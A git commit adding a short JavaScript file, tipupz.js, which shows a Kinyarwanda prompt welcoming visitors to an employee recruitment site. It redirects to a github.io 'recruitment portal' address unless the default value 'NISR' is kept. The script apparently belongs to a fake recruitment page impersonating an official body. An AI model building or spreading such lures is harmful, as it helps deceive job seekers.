c70ac234369f9469d7b2c8357445ba56aad9a300
offernoww <josiahnyeti16@gmail.com>
2025-02-14 22:06:04 +0100

    Create tipupz.js

---
+++ tipupz.js
@@ -0,0 +1,6 @@
+
+var password = 'NISR'
+password=prompt('SMS :Murakaza neza kurubuga rwabakozi, kanda OK kugirango utangire gusaba.  ','NISR');
+if (password != 'NISR') {
+location.href='https://offernoww.github.io/recuitment-portal-statistics.rw';
+}
